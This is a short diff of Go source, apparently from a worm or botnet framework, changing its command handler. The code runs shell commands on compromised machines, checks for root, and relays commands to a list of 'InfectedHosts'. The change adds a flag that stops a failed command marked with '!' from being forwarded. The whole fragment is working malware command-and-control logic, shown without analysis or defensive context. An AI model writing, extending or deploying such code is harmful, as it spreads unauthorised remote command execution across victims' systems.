@@ -238,6 +238,7 @@ func handle_command(cmd string) {
 	}
 	preamble := strings.Fields(cmd)[0]
 	can_execute := true
+	no_forward := false
 	if strings.Contains(preamble, "e") {
 		if !coldfire.IsRoot() {
 			can_execute = false
@@ -257,6 +258,9 @@ func handle_command(cmd string) {
 		if strings.Contains(preamble, "x") && can_execute {
 			out, err := coldfire.CmdOut(cmd)
 			if err != nil {
+				if strings.Contains(preamble, "!") {
+					no_forward = true
+				}
 				out += ": " + err.Error()
 			}
 			if strings.Contains(preamble, "d") {
@@ -274,7 +278,7 @@ func handle_command(cmd string) {
 				}
 			}
 		}
-		if strings.Contains(preamble, "a") {
+		if strings.Contains(preamble, "a") && !no_forward {
 			for _, host := range InfectedHosts {
 				err := DataSender(host, NeuraxConfig.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
 				ReportError("Cannot send command", err)
